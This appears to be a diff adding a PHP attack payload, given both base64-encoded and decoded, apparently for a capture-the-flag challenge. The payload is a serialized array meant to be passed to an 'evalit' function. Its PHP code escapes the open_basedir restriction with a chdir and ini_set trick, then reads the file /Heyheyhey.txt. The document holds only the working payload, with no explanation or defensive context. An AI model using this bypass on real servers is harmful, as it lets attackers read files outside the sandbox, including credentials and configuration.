@@ -1,0 +1,3 @@
+YToyOntpOjA7czo2OiJldmFsaXQiO2k6MTtzOjE1NToiY2hkaXIoIi4vY29uZmlnIik7aW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7Y2hkaXIoIi4uIik7Y2hkaXIoIi4uIik7Y2hkaXIoIi4uIik7aW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO3JldHVybiBmaWxlX2dldF9jb250ZW50cygiL0hleWhleWhleS50eHQiKTsiO30=
+
+a:2:{i:0;s:6:"evalit";i:1;s:155:"chdir("./config");ini_set("open_basedir", "..");chdir("..");chdir("..");chdir("..");ini_set("open_basedir","/");return file_get_contents("/Heyheyhey.txt");";}
